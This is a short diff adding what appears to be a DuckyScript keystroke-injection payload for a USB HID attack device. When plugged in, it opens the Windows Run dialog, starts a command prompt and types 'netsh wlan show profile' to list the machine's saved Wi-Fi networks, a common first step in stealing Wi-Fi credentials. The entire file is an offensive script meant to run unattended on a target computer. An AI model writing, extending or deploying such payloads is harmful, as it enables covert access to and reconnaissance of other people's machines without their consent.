@@ -1,0 +1,7 @@
+GUI r
+DELAY 1000
+STRING cmd
+ENTER
+DELAY 1000
+STRING netsh wlan show profile
+ENTER
